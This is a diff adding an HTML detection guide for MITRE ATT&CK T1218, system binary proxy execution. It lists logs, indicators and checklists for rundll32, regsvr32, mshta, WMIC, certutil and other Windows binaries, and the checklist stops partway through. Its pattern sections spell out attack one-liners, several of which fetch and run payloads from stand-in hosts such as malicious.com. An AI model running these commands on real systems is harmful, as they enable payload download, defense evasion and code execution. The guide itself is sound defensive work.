@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<title>System Binary Proxy Execution (T1218)</title>
+	<style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 20px;
+            line-height: 1.6;
+            background-color: #f5f5f5;
+        }
+        h2 {
+            color: #2c3e50;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+            margin-top: 30px;
+        }
+        ul {
+            list-style: none;
+            padding: 0;
+        }
+        li {
+            margin: 10px 0;
+            padding: 8px;
+            background: white;
+            border-radius: 4px;
+            display: flex;
+            align-items: flex-start;
+        }
+        input[type="checkbox"] {
+            margin-right: 10px;
+            margin-top: 4px;
+            cursor: pointer;
+            flex-shrink: 0;
+        }
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.9em;
+        }
+    </style>
+</head>
+<body>
+	<h1>System Binary Proxy Execution: <a href="https://attack.mitre.org/techniques/T1218/">T1218</a></h1>
+<h2>Detection Explanation</h2>
+<p>System Binary Proxy Execution involves adversaries abusing legitimate, signed system binaries to execute malicious code, scripts, or commands. This technique enables attackers to evade application whitelisting controls, bypass User Account Control (UAC), leverage trusted binaries to avoid detection, and hide malicious activity behind legitimate Windows processes. System binary proxy execution is commonly used throughout the attack lifecycle for initial access, execution, defense evasion, and persistence.</p>
+<p>Attackers use system binary proxy execution because these binaries are digitally signed by Microsoft or other trusted vendors, inherently trusted by security controls, whitelisted by application control policies, and less likely to trigger alerts when executed. Common methods include abusing Rundll32 (T1218.011) to execute DLL functions, Regsvr32 (T1218.010) for COM scriptlet execution, Mshta (T1218.005) for HTML application execution, and other binaries like WMIC, Certutil, Regasm, Installutil, and Mavinject. These techniques are frequently combined with other evasion methods like obfuscation or remote file downloads.</p>
+<p>Successful system binary proxy execution allows adversaries to execute arbitrary code with the appearance of legitimate system activity, bypass security controls designed to prevent unauthorized code execution, maintain persistence through trusted execution paths, and evade behavioral detection by hiding within expected process activity. The impact includes undetected malware execution, credential theft, lateral movement, command and control establishment, and data exfiltration—all while appearing as normal system operations.</p>
+<p>Detection requires monitoring for unusual command-line parameters with system binaries, tracking execution from unexpected parent processes, identifying network connections from binaries that don’t typically communicate externally, and correlating proxy execution with other suspicious activities. Organizations should baseline normal usage patterns for these binaries and alert on anomalies such as script execution via Mshta, DLL loading from unusual paths via Rundll32, or remote scriptlet execution via Regsvr32.</p>
+<hr>
+<h2>Key Detection Indicators &amp; Areas to Investigate</h2>
+<h3>Summary of Indicators</h3>
+<ol>
+<li>Rundll32 executing DLLs from unusual locations (T1218.011)</li>
+<li>Regsvr32 executing remote scriptlets or non-standard scripts (T1218.010)</li>
+<li>Mshta executing HTA files or JavaScript/VBScript (T1218.005)</li>
+<li>WMIC executing commands or scripts (T1218.010)</li>
+<li>Certutil downloading files or decoding malicious payloads</li>
+<li>Regasm/Regsvcs executing non-.NET assemblies</li>
+<li>Installutil executing malicious installers</li>
+<li>MSBuild compiling and executing inline code</li>
+<li>Mavinject injecting DLLs into processes</li>
+<li>System binary execution with suspicious parent processes</li>
+</ol>
+<hr>
+<h3>1. Rundll32 Executing DLLs from Unusual Locations</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Rundll32.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Rundll32.exe with detailed command line</li>
+<li>Event ID 7 (Image loaded) - DLLs loaded by Rundll32</li>
+<li>Event ID 3 (Network connection) - Network activity from Rundll32</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentImage</code>, <code>Image</code></li>
+</ul>
+<p><strong>PowerShell Logs:</strong></p>
+<ul>
+<li>Event ID 4104 (Script block logging) - PowerShell launching Rundll32</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>rundll32.exe C:\Users\Public\malicious.dll,EntryPoint</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;alert('code')</code></li>
+<li><code>rundll32.exe url.dll,OpenURL http://malicious.com/payload.exe</code></li>
+<li><code>rundll32.exe advpack.dll,LaunchINFSection malicious.inf,DefaultInstall</code></li>
+<li><code>rundll32.exe shell32.dll,Control_RunDLL C:\malware.cpl</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>DLLs executed from non-system directories</li>
+<li>Network connections initiated by Rundll32</li>
+<li>JavaScript or VBScript protocol handlers</li>
+<li>Export functions with suspicious names</li>
+<li>Rundll32 spawned from Office applications or browsers</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Rundll32 executing DLLs from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code>, <code>C:\ProgramData\</code></li>
+<li>Command lines with JavaScript protocol: <code>rundll32.exe javascript:&quot;...&quot;</code></li>
+<li>Rundll32 making outbound network connections (Sysmon Event ID 3)</li>
+<li>Parent process: <code>winword.exe</code>, <code>excel.exe</code>, <code>outlook.exe</code>, <code>chrome.exe</code> spawning Rundll32</li>
+<li>Export function names suggesting malicious activity: <code>DllRegisterServer</code>, <code>Main</code>, <code>EntryPoint</code>, random names</li>
+<li><code>url.dll,OpenURL</code> or <code>url.dll,FileProtocolHandler</code> downloading executables</li>
+<li><code>advpack.dll,LaunchINFSection</code> executing INF files from suspicious locations</li>
+<li><code>shell32.dll,Control_RunDLL</code> executing .cpl files outside <code>C:\Windows\System32\</code></li>
+<li>Rundll32 with no command-line arguments (DLL path missing - shellcode injection indicator)</li>
+<li>Multiple Rundll32 instances executing sequentially from same staging directory</li>
+</ul>
+<hr>
+<h3>2. Regsvr32 Executing Remote Scriptlets or Non-Standard Scripts</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Regsvr32.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Regsvr32.exe command lines</li>
+<li>Event ID 3 (Network connection) - Regsvr32 network activity (squiblydoo technique)</li>
+<li>Event ID 7 (Image loaded) - DLLs/scripts loaded by Regsvr32</li>
+<li>Event ID 13 (Registry value set) - COM object registration</li>
+</ul>
+<p><strong>Network Logs:</strong></p>
+<ul>
+<li>Proxy logs - Regsvr32 downloading remote scriptlets</li>
+<li>DNS logs - Regsvr32 resolving external domains</li>
+<li>Firewall logs - Outbound connections from Regsvr32</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll</code> (squiblydoo)</li>
+<li><code>regsvr32.exe /s /i:http://attacker.com/evil.sct scrobj.dll</code></li>
+<li><code>regsvr32.exe /s C:\Users\Public\malicious.dll</code></li>
+<li><code>regsvr32.exe /u /n /s /i:http://site.com/script.sct scrobj.dll</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Remote scriptlet execution (squiblydoo technique)</li>
+<li>Network connections from Regsvr32</li>
+<li>Script files (.sct) executed remotely</li>
+<li>Regsvr32 with unusual command-line switches</li>
+<li>Execution from non-administrative contexts</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Regsvr32 with <code>/i:http://</code> or <code>/i:https://</code> parameters (remote scriptlet download)</li>
+<li>Network connections from <code>regsvr32.exe</code> to external IPs (Sysmon Event ID 3)</li>
+<li>Command line containing <code>scrobj.dll</code> with <code>/i:</code> switch (squiblydoo technique)</li>
+<li>Regsvr32 executing from <code>%TEMP%</code>, <code>%APPDATA%</code>, or user directories</li>
+<li><code>/s</code> (silent), <code>/n</code> (no DllRegisterServer), <code>/u</code> (unregister) switches in suspicious combinations</li>
+<li>Parent processes: Office applications, browsers, or script interpreters spawning Regsvr32</li>
+<li><code>.sct</code> (scriptlet) files downloaded and executed from external URLs</li>
+<li>Regsvr32 executing during off-hours or from non-administrative user accounts</li>
+<li>Registry COM object registration (Event ID 13) from unexpected locations</li>
+<li>PowerShell or command scripts launching Regsvr32 with remote URLs</li>
+</ul>
+<hr>
+<h3>3. Mshta Executing HTA Files or JavaScript/VBScript</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Mshta.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Mshta.exe command lines</li>
+<li>Event ID 3 (Network connection) - Mshta downloading remote HTA files</li>
+<li>Event ID 11 (File created) - HTA files downloaded by Mshta</li>
+<li>Event ID 10 (ProcessAccess) - Mshta accessing other processes (injection)</li>
+</ul>
+<p><strong>Network Logs:</strong></p>
+<ul>
+<li>Proxy logs - Mshta downloading .hta files</li>
+<li>DNS logs - Domain resolution by Mshta</li>
+<li>Firewall logs - Outbound connections from Mshta</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>mshta.exe http://malicious.com/payload.hta</code></li>
+<li><code>mshta.exe C:\Users\Public\malicious.hta</code></li>
+<li><code>mshta.exe javascript:close(new ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd.exe&quot;))</code></li>
+<li><code>mshta.exe vbscript:Execute(&quot;CreateObject(&quot;&quot;WScript.Shell&quot;&quot;).Run(&quot;&quot;cmd&quot;&quot;)&quot;)</code></li>
+<li><code>mshta.exe &quot;about:&lt;script&gt;alert('code')&lt;/script&gt;&quot;</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Remote HTA file execution</li>
+<li>Inline JavaScript or VBScript execution</li>
+<li>Network connections from Mshta</li>
+<li>Mshta spawning child processes (cmd.exe, powershell.exe)</li>
+<li>HTA files in unusual locations</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Mshta executing URLs: <code>mshta.exe http://</code> or <code>mshta.exe https://</code></li>
+<li>Inline script execution: <code>mshta.exe javascript:</code> or <code>mshta.exe vbscript:</code></li>
+<li>Mshta making network connections to external IPs (Sysmon Event ID 3)</li>
+<li>HTA files executed from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code>, email attachments</li>
+<li>Mshta spawning <code>cmd.exe</code>, <code>powershell.exe</code>, <code>wscript.exe</code>, or other interpreters</li>
+<li>Parent processes: Email clients, browsers, Office applications launching Mshta</li>
+<li>Command lines with encoded or obfuscated scripts</li>
+<li>Mshta accessing other process memory (Sysmon Event ID 10) - process injection</li>
+<li><code>.hta</code> file downloads followed immediately by Mshta execution</li>
+<li>Mshta execution during phishing or initial access timeframes</li>
+</ul>
+<hr>
+<h3>4. WMIC Executing Commands or Scripts</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Wmic.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - WMIC command lines</li>
+<li>Event ID 3 (Network connection) - WMIC network activity</li>
+<li>Event ID 11 (File created) - Files created by WMIC execution</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>wmic process call create &quot;cmd.exe /c malicious.exe&quot;</code></li>
+<li><code>wmic /node:target process call create &quot;powershell.exe -enc &lt;base64&gt;&quot;</code></li>
+<li><code>wmic os get /format:&quot;http://malicious.com/evil.xsl&quot;</code></li>
+<li><code>wmic process get brief /format:list</code></li>
+<li><code>wmic /node:@targets.txt process call create &quot;cmd.exe&quot;</code></li>
+</ul>
+<p><strong>XSL Script Abuse:</strong></p>
+<ul>
+<li><code>/format</code> parameter loading remote XSL stylesheets</li>
+<li>XSL containing embedded scripts (JScript, VBScript)</li>
+<li>Local XSL files with malicious code</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>WMIC creating processes locally or remotely</li>
+<li>XSL script execution via /format parameter</li>
+<li>Remote execution via /node parameter</li>
+<li>Network connections from WMIC</li>
+<li>WMIC spawned from suspicious parent processes</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><code>wmic process call create</code> executing commands or malware</li>
+<li>WMIC with <code>/node:</code> parameter targeting remote systems (lateral movement)</li>
+<li><code>/format:</code> parameter loading remote XSL: <code>wmic os get /format:&quot;http://attacker.com/payload.xsl&quot;</code></li>
+<li>WMIC making outbound network connections (Sysmon Event ID 3)</li>
+<li>XSL files containing embedded scripts in <code>msxsl:script</code> tags</li>
+<li>WMIC creating processes: <code>cmd.exe</code>, <code>powershell.exe</code>, executables from <code>%TEMP%</code></li>
+<li>Parent processes: Office applications, browsers, or compromised services spawning WMIC</li>
+<li>WMIC with base64-encoded PowerShell commands</li>
+<li>Remote execution to multiple systems: <code>wmic /node:@computerlist.txt</code></li>
+<li>WMIC execution during reconnaissance or lateral movement phases</li>
+</ul>
+<hr>
+<h3>5. Certutil Downloading Files or Decoding Malicious Payloads</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Certutil.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Certutil command lines</li>
+<li>Event ID 3 (Network connection) - Certutil network activity</li>
+<li>Event ID 11 (File created) - Files downloaded or decoded by Certutil</li>
+</ul>
+<p><strong>Network Logs:</strong></p>
+<ul>
+<li>Proxy logs - Certutil downloading files</li>
+<li>DNS logs - Domain resolution by Certutil</li>
+<li>Firewall logs - Outbound HTTP/HTTPS from Certutil</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>certutil.exe -urlcache -split -f http://malicious.com/payload.exe C:\temp\malware.exe</code></li>
+<li><code>certutil.exe -decode encoded.txt decoded.exe</code></li>
+<li><code>certutil.exe -decodehex hexfile.txt binary.exe</code></li>
+<li><code>certutil.exe -verifyctl -split -f http://attacker.com/payload</code></li>
+</ul>
+<p><strong>Legitimate vs. Malicious Usage:</strong></p>
+<ul>
+<li>Legitimate: Certificate management, CRL verification</li>
+<li>Malicious: File downloads, base64/hex decoding, payload staging</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Certutil downloading files from external URLs</li>
+<li>Base64 or hex decoding operations</li>
+<li>File downloads to suspicious locations</li>
+<li>Network connections from Certutil</li>
+<li>Certutil used for non-certificate operations</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Certutil with <code>-urlcache</code> and <code>-f</code> downloading executables: <code>.exe</code>, <code>.dll</code>, <code>.ps1</code></li>
+<li>Downloads to suspicious directories: <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code></li>
+<li><code>-decode</code> or <code>-decodehex</code> operations creating executable files</li>
+<li>Network connections from <code>certutil.exe</code> to external IPs (Sysmon Event ID 3)</li>
+<li>Certutil downloading from IP addresses instead of domain names</li>
+<li>Command lines with multiple operations: download, decode, split</li>
+<li>Parent processes: Office apps, browsers, script interpreters launching Certutil</li>
+<li>Certutil executed immediately after phishing email or document opening</li>
+<li>Downloaded files executed shortly after Certutil completion</li>
+<li>Certutil used in conjunction with other living-off-the-land binaries (LOLBins)</li>
+</ul>
+<hr>
+<h3>6. Regasm/Regsvcs Executing Non-.NET Assemblies</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Regasm.exe or Regsvcs.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Regasm/Regsvcs command lines</li>
+<li>Event ID 7 (Image loaded) - Assemblies loaded</li>
+<li>Event ID 3 (Network connection) - Network activity from Regasm/Regsvcs</li>
+<li>Event ID 10 (ProcessAccess) - Process injection attempts</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>regasm.exe /U C:\malicious\assembly.dll</code></li>
+<li><code>regsvcs.exe C:\Users\Public\malware.dll</code></li>
+<li><code>regasm.exe C:\Temp\payload.dll /codebase</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Regasm/Regsvcs executing from non-development systems</li>
+<li>Assemblies loaded from unusual locations</li>
+<li>Network connections from these binaries</li>
+<li>Execution by non-developer accounts</li>
+<li>DLLs from temporary or user-writable directories</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Regasm/Regsvcs executing assemblies from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code></li>
+<li>Network connections from <code>regasm.exe</code> or <code>regsvcs.exe</code> (Sysmon Event ID 3)</li>
+<li>Execution on systems without development tools installed</li>
+<li>User accounts executing Regasm/Regsvcs that aren’t developers</li>
+<li>DLL files recently downloaded or created then immediately registered</li>
+<li>Command lines with <code>/U</code> (unregister) used to execute malicious code</li>
+<li>Parent processes: Office applications, browsers, or script interpreters</li>
+<li>Regasm/Regsvcs spawning child processes: <code>cmd.exe</code>, <code>powershell.exe</code></li>
+<li>Process injection (Sysmon Event ID 10) from Regasm/Regsvcs</li>
+<li>Assemblies without .NET metadata or suspicious entry points</li>
+</ul>
+<hr>
+<h3>7. Installutil Executing Malicious Installers</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - InstallUtil.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - InstallUtil command lines</li>
+<li>Event ID 7 (Image loaded) - Assemblies loaded by InstallUtil</li>
+<li>Event ID 3 (Network connection) - Network activity from InstallUtil</li>
+<li>Event ID 10 (ProcessAccess) - Process access by InstallUtil</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>installutil.exe /logfile= /LogToConsole=false /U C:\malicious.dll</code></li>
+<li><code>installutil.exe C:\Users\Public\malware.exe</code></li>
+<li><code>installutil.exe /installtype=notransaction /action=install C:\payload.dll</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>InstallUtil on non-development systems</li>
+<li>Installers from unusual locations</li>
+<li>Network connections from InstallUtil</li>
+<li>Bypassing logging with /logfile parameter</li>
+<li>Execution by non-administrative or non-developer accounts</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>InstallUtil executing assemblies from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code></li>
+<li><code>/logfile=</code> parameter set to empty or null (hiding execution logs)</li>
+<li><code>/LogToConsole=false</code> suppressing output</li>
+<li>Network connections from <code>installutil.exe</code> (Sysmon Event ID 3)</li>
+<li>Execution on servers or workstations without Visual Studio or .NET SDK</li>
+<li>InstallUtil spawning child processes: <code>cmd.exe</code>, <code>powershell.exe</code></li>
+<li><code>/U</code> (uninstall) parameter used to trigger malicious code</li>
+<li>Parent processes: Office apps, browsers, or scripts launching InstallUtil</li>
+<li>Recently downloaded or created assemblies immediately executed</li>
+<li>InstallUtil accessing other process memory (process injection)</li>
+</ul>
+<hr>
+<h3>8. MSBuild Compiling and Executing Inline Code</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - MSBuild.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - MSBuild command lines</li>
+<li>Event ID 11 (File created) - Project files or compiled outputs</li>
+<li>Event ID 3 (Network connection) - Network activity from MSBuild</li>
+<li>Event ID 7 (Image loaded) - Assemblies loaded during compilation</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>msbuild.exe C:\malicious\project.csproj</code></li>
+<li><code>msbuild.exe C:\Users\Public\payload.xml</code></li>
+<li><code>msbuild.exe /target:ClassLibrary C:\inline_code.proj</code></li>
+</ul>
+<p><strong>Inline Code Techniques:</strong></p>
+<ul>
+<li>XML project files with embedded C# or <a href="http://VB.NET">VB.NET</a> code</li>
+<li><code>&lt;UsingTask&gt;</code> elements with inline tasks</li>
+<li>Code execution through build process</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>MSBuild on non-development systems</li>
+<li>Project files from unusual locations</li>
+<li>XML files executed as build projects</li>
+<li>Network connections from MSBuild</li>
+<li>Execution by non-developer accounts</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>MSBuild executing <code>.csproj</code> or <code>.xml</code> files from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code></li>
+<li>XML project files containing inline <code>&lt;Code&gt;</code> sections with C# or <a href="http://VB.NET">VB.NET</a></li>
+<li>MSBuild on systems without Visual Studio or .NET development tools</li>
+<li>Network connections from <code>msbuild.exe</code> (Sysmon Event ID 3)</li>
+<li>Project files downloaded from external sources then immediately built</li>
+<li>MSBuild spawning child processes: <code>cmd.exe</code>, <code>powershell.exe</code>, malware</li>
+<li>Parent processes: Office apps, browsers, or scripts launching MSBuild</li>
+<li><code>&lt;UsingTask&gt;</code> elements with suspicious inline task implementations</li>
+<li>Build files with obfuscated or encoded code sections</li>
+<li>MSBuild execution during off-hours or by non-developer accounts</li>
+</ul>
+<hr>
+<h3>9. Mavinject Injecting DLLs into Processes</h3>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Mavinject.exe execution</li>
+<li>Key fields: <code>CommandLine</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - Mavinject command lines</li>
+<li>Event ID 8 (CreateRemoteThread) - Thread creation for injection</li>
+<li>Event ID 10 (ProcessAccess) - Process access by Mavinject</li>
+<li>Event ID 7 (Image loaded) - DLLs loaded via injection</li>
+</ul>
+<p><strong>Command-Line Patterns:</strong></p>
+<ul>
+<li><code>mavinject.exe &lt;PID&gt; /INJECTRUNNING C:\malicious.dll</code></li>
+<li><code>mavinject.exe 1234 /INJECTRUNNING C:\Users\Public\payload.dll</code></li>
+<li><code>mavinject32.exe &lt;PID&gt; /INJECTRUNNING &lt;DLL_Path&gt;</code></li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>Mavinject injecting DLLs from unusual locations</li>
+<li>Injection into sensitive processes</li>
+<li>Network connections after DLL injection</li>
+<li>Mavinject executed by non-standard users</li>
+<li>DLLs without valid signatures</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li>Mavinject injecting DLLs from <code>%TEMP%</code>, <code>%APPDATA%</code>, <code>C:\Users\Public\</code>, <code>C:\ProgramData\</code></li>
+<li>Target processes: <code>explorer.exe</code>, <code>svchost.exe</code>, browser processes, security tools</li>
+<li>DLLs without digital signatures or signed by untrusted entities</li>
+<li>Sysmon Event ID 8 (CreateRemoteThread) from Mavinject to target process</li>
+<li>Network connections from previously benign processes after injection</li>
+<li>Mavinject executed by non-administrative or system accounts</li>
+<li>Parent processes: Office apps, browsers, or malicious processes launching Mavinject</li>
+<li>Injection immediately following malware execution or compromise</li>
+<li>Multiple injection attempts targeting different processes</li>
+<li>DLL paths with suspicious names or recently created timestamps</li>
+</ul>
+<hr>
+<h3>10. System Binary Execution with Suspicious Parent Processes</h3>
+<p><strong>Sysmon:</strong></p>
+<ul>
+<li>Event ID 1 (Process creation) - System binaries with unusual parents</li>
+<li>Key fields: <code>Image</code>, <code>ParentImage</code>, <code>CommandLine</code></li>
+</ul>
+<p><strong>Windows Event Logs (Security):</strong></p>
+<ul>
+<li>Event ID 4688 (Process creation) - Process relationships</li>
+<li>Key fields: <code>NewProcessName</code>, <code>ParentProcessName</code></li>
+</ul>
+<p><strong>Suspicious Parent-Child Relationships:</strong></p>
+<ul>
+<li>Office applications spawning system binaries</li>
+<li>Browsers spawning execution proxies</li>
+<li>Email clients launching system utilities</li>
+<li>Script interpreters spawning multiple proxies</li>
+</ul>
+<p><strong>Focus on:</strong></p>
+<ul>
+<li>System binaries launched from Office applications</li>
+<li>Rundll32, Regsvr32, Mshta from browsers</li>
+<li>Multiple system binaries in execution chain</li>
+<li>System binaries from email client processes</li>
+<li>Unusual process trees indicating compromise</li>
+</ul>
+<p><strong>Suspicious indicators:</strong></p>
+<ul>
+<li><code>winword.exe</code>, <code>excel.exe</code>, <code>outlook.exe</code> spawning <code>rundll32.exe</code>, <code>mshta.exe</code>, <code>regsvr32.exe</code></li>
+<li><code>chrome.exe</code>, <code>firefox.exe</code>, <code>iexplore.exe</code> as parent of system proxy execution binaries</li>
+<li>PowerShell spawning Certutil, WMIC, or other LOLBins in rapid succession</li>
+<li>Email clients (<code>outlook.exe</code>, <code>thunderbird.exe</code>) spawning <code>mshta.exe</code> or <code>rundll32.exe</code></li>
+<li>Execution chains: <code>winword.exe</code> → <code>powershell.exe</code> → <code>certutil.exe</code> → <code>rundll32.exe</code></li>
+<li>Scripting hosts (<code>wscript.exe</code>, <code>cscript.exe</code>) spawning system binaries</li>
+<li>PDF readers (<code>AcroRd32.exe</code>) spawning <code>mshta.exe</code> or <code>regsvr32.exe</code></li>
+<li>Web server processes (<code>w3wp.exe</code>, <code>apache.exe</code>) spawning system proxy binaries</li>
+<li>Multiple system binaries executed in sequence from same parent process</li>
+<li>System binaries spawned during document opening or email attachment processing</li>
+</ul>
+<hr>
+<h1>System Binary Proxy Execution Investigation Checklist</h1>
+
+<h2>1. Rundll32 Suspicious Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Rundll32 executing DLLs from %TEMP%, %APPDATA%, C:\Users\Public, C:\ProgramData\</label></li>
+  <li><label><input type="checkbox"> Review command lines with JavaScript protocol: rundll32.exe javascript:“…”</label></li>
+  <li><label><input type="checkbox"> Monitor Rundll32 making outbound network connections (Sysmon Event ID 3)</label></li>
+  <li><label><input type="checkbox"> Identify parent processes: winword.exe, excel.exe, chrome.exe spawning Rundll32</label></li>
+  <li><label><input type="checkbox"> Look for export functions: DllRegisterServer, Main, EntryPoint, random names</label></li>
+  <li><label><input type="checkbox"> Check url.dll,OpenURL or url.dll,FileProtocolHandler downloading executables</label></li>
+  <li><label><input type="checkbox"> Review advpack.dll,LaunchINFSection executing INF files from suspicious locations</label></li>
+  <li><label><input type="checkbox"> Monitor Rundll32 with no command-line arguments (DLL path missing)</label></li>
+</ul>
+
+<h2>2. Regsvr32 Remote Scriptlet Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Regsvr32 with /i:http:// or /i:https:// parameters (squiblydoo)</label></li>
+  <li><label><input type="checkbox"> Review network connections from regsvr32.exe to external IPs</label></li>
+  <li><label><input type="checkbox"> Monitor command lines with scrobj.dll and /i: switch</label></li>
+  <li><label><input type="checkbox"> Identify Regsvr32 executing from %TEMP%, %APPDATA%, user directories</label></li>
+  <li><label><input type="checkbox"> Look for /s (silent), /n (no DllRegisterServer), /u combinations</label></li>
+  <li><label><input type="checkbox"> Check parent processes: Office apps, browsers, scripts spawning Regsvr32</label></li>
+  <li><label><input type="checkbox"> Review .sct (scriptlet) files downloaded from external URLs</label></li>
+  <li><label><input type="checkbox"> Monitor Regsvr32 during off-hours or from non-administrative accounts</label></li>
+</ul>
+
+<h2>3. Mshta HTA/Script Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check Mshta executing URLs: mshta.exe http:// or https://</label></li>
+  <li><label><input type="checkbox"> Review inline scripts: mshta.exe javascript: or mshta.exe vbscript:</label></li>
+  <li><label><input type="checkbox"> Monitor Mshta making network connections to external IPs</label></li>
+  <li><label><input type="checkbox"> Identify HTA files from %TEMP%, %APPDATA%, C:\Users\Public, email attachments</label></li>
+  <li><label><input type="checkbox"> Look for Mshta spawning cmd.exe, powershell.exe, wscript.exe</label></li>
+  <li><label><input type="checkbox"> Check parent processes: Email clients, browsers, Office apps launching Mshta</label></li>
+  <li><label><input type="checkbox"> Review Mshta accessing other process memory (process injection)</label></li>
+  <li><label><input type="checkbox"> Monitor .hta downloads followed immediately by Mshta execution</label></li>
+</ul>
+
+<h2>4. WMIC Command Execution</h2>
+<ul>
+  <li><label><input type="checkbox"> Check wmic process call create executing commands or malware</label></li>
+  <li><label><input type="checkbox"> Review WMIC with /node: parameter targeting remote systems</label></li>
+  <li><label><input type="checkbox"> Monitor /format: loading remote XSL: wmic os get /format:“http://…”</label></li>
+  <li><label><input type="checkbox"> Identify WMIC making outbound network connections</label></li>
+  <li><label><input type="checkbox"> Look for XSL files with embedded scripts in msxsl:script tags</label></li>
+  <li><label><input type="checkbox"> Check WMIC creating: cmd.exe, powershell.exe, executables from %TEMP%</label></li>
+  <li><label><input type="checkbox"> Review parent processes: Office apps, browsers, compromised services spawning WMIC</label></li>
+  <li><label><input type="checkbox"> Monitor remote execution: wmic /node:@computerlist.txt</label></li>
+</ul>
+
+<h2>5. Certutil File Download/Decode</h2>
+<ul>
